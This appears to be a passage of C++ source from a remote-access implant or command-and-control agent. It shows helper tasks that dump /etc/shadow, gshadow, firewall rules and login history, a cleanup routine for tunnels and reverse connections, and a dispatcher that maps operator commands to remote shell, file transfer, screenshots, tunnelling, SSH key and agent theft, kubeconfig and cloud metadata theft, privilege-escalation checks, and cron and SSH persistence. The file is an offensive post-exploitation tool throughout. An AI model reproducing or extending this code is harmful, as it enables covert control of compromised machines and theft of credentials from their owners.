static bytes task_iptables(){ return generic_answer(run_shell("iptables -L -n -v 2>/dev/null; echo '--- NAT ---'; iptables -t nat -L -n -v 2>/dev/null; echo '--- nftables ---'; nft list ruleset 2>/dev/null | head -200")); }
static bytes task_last(){ return generic_answer(run_shell("last -a 2>/dev/null | head -100")); }
static bytes task_shadow(){ return generic_answer(run_shell("cat /etc/shadow 2>/dev/null; echo '--- gshadow ---'; cat /etc/gshadow 2>/dev/null")); }

void cleanup_agent_resources(){
    {
        std::lock_guard<std::mutex> lk(tun_mu);
        for(auto& kv : tunnels){ if(kv.second.fd>=0) close(kv.second.fd); }
        tunnels.clear();
    }
    {
        std::lock_guard<std::mutex> lk(rev_mu);
        for(auto& kv : reverse_fds){ if(kv.second>=0) close(kv.second); }
        reverse_fds.clear();
    }
    {
        std::lock_guard<std::mutex> lk(term_mu);
        for(auto& kv : terms){
            if(kv.second.master>=0) close(kv.second.master);
            if(kv.second.pid>0){ kill(kv.second.pid,SIGKILL); waitpid(kv.second.pid,nullptr,0); }
        }
        terms.clear();
    }
    {
        std::lock_guard<std::mutex> lk(dl_mu);
        for(auto& kv : downloads){ if(kv.second.fd>=0) close(kv.second.fd); }
        downloads.clear();
    }
    {
        std::lock_guard<std::mutex> lk(upload_mu);
        for(auto& kv : upload_fds){ if(kv.second>=0) close(kv.second); }
        upload_fds.clear();
    }
}

void set_payload_sleep(int sec,int jit){ sleep_sec=sec; sleep_jit=jit; }

// ---------------------------------------------------------------------
// Command dispatcher
// ---------------------------------------------------------------------
bytes task_process(const bytes& command_bytes){
    try {
        MpReader r{command_bytes}; uint32_t n=r.read_map(); uint32_t code=0,id=0; bytes data;
        for(uint32_t i=0;i<n;i++){
            std::string k=r.read_str();
            if(k=="code") code=(uint32_t)r.read_u64();
            else if(k=="id") id=(uint32_t)r.read_u64();
            else if(k=="data") data=r.read_bin();
            else r.skip_value();
        }
        bytes answer;
        bool has_answer=true;
        switch(code){
            case CMD_PWD: answer=task_pwd(); break;
            case CMD_CD: answer=task_cd(data); break;
            case CMD_SHELL: answer=task_shell(data); break;
            case CMD_RUN: answer=task_run(data); break;
            case CMD_EXIT: answer=task_exit(); break;
            case CMD_DOWNLOAD: answer=task_download(id,data); break;
            case CMD_UPLOAD: answer=task_upload(data); break;
            case CMD_CAT: answer=task_cat(data); break;
            case CMD_CP: answer=task_cp(data); break;
            case CMD_MV: answer=task_mv(data); break;
            case CMD_MKDIR: answer=task_mkdir(data); break;
            case CMD_RM: answer=task_rm(data); break;
            case CMD_LS: answer=task_ls(data); break;
            case CMD_PS: answer=task_ps(); break;
            case CMD_KILL: answer=task_kill(data); break;
            case CMD_ZIP: answer=task_zip(data); break;
            case CMD_SCREENSHOT: answer=task_screenshot(); break;
            case CMD_TUNNEL_START: answer=task_tunnel_start(data); break;
            case CMD_TUNNEL_START_UDP: answer=task_tunnel_start(data); break;
            case CMD_TUNNEL_WRITE: answer=task_tunnel_write(data); break;
            case CMD_TUNNEL_WRITE_UDP: answer=task_tunnel_write(data); break;
            case CMD_TUNNEL_STOP: answer=task_tunnel_stop(data); break;
            case CMD_TUNNEL_PAUSE: answer=task_tunnel_pause(data); break;
            case CMD_TUNNEL_RESUME: answer=task_tunnel_resume(data); break;
            case CMD_TUNNEL_REVERSE: answer=task_tunnel_reverse(data); break;
            case CMD_TERMINAL_START: answer=task_terminal_start(data); break;
            case CMD_TERMINAL_WRITE: answer=task_terminal_write(data); break;
            case CMD_TERMINAL_STOP: answer=task_terminal_stop(data); break;
            case CMD_SYSINFO: answer=task_sysinfo(); break;
            case CMD_ENV: answer=task_env(); break;
            case CMD_NETWORK: answer=task_network(); break;
            case CMD_USERS: answer=task_users(); break;
            case CMD_CRON: answer=task_cron(); break;
            case CMD_SSH_KEYS: answer=task_sshkeys(); break;
            case CMD_HISTORY: answer=task_history(); break;
            case CMD_DOCKER: answer=task_docker(); break;
            case CMD_SERVICES: answer=task_services(); break;
            case CMD_PRIVESC: answer=task_privesc(); break;
            case CMD_MOUNTS: answer=task_mounts(); break;
            case CMD_PERSIST_CRON: answer=task_persist_cron(data); break;
            case CMD_PERSIST_SSH: answer=task_persist_ssh(data); break;
            case CMD_GETUID: answer=task_getuid(); break;
            case CMD_FILESEARCH: answer=task_filesearch(data); break;
            case CMD_SSHAGENT: answer=task_sshagent(); break;
            case CMD_KUBECONFIG: answer=task_kubeconfig(); break;
            case CMD_CLOUDMETA: answer=task_cloudmeta(); break;
            case CMD_SLEEP: answer=task_sleep(data); break;
            case CMD_WHOAMI: answer=task_whoami(); break;
            case CMD_HOSTNAME: answer=task_hostname(); break;
            case CMD_LSOF: answer=task_lsof(); break;
            case CMD_IPTABLES: answer=task_iptables(); break;
            case CMD_LAST: answer=task_last(); break;
            case CMD_SHADOW: answer=task_shadow(); break;
            default: has_answer=false; break;
        }
        if(!has_answer) return {};
        return mp_map({{"code",mp_u64(code)},{"id",mp_u64(id)},{"data",mp_bin(answer)}});
    } catch(...) {
        return mp_map({{"code",mp_u64(CMD_ERROR)},{"id",mp_u64(0)},{"data",mp_bin(err_answer("invalid task data"))}});
    }
}
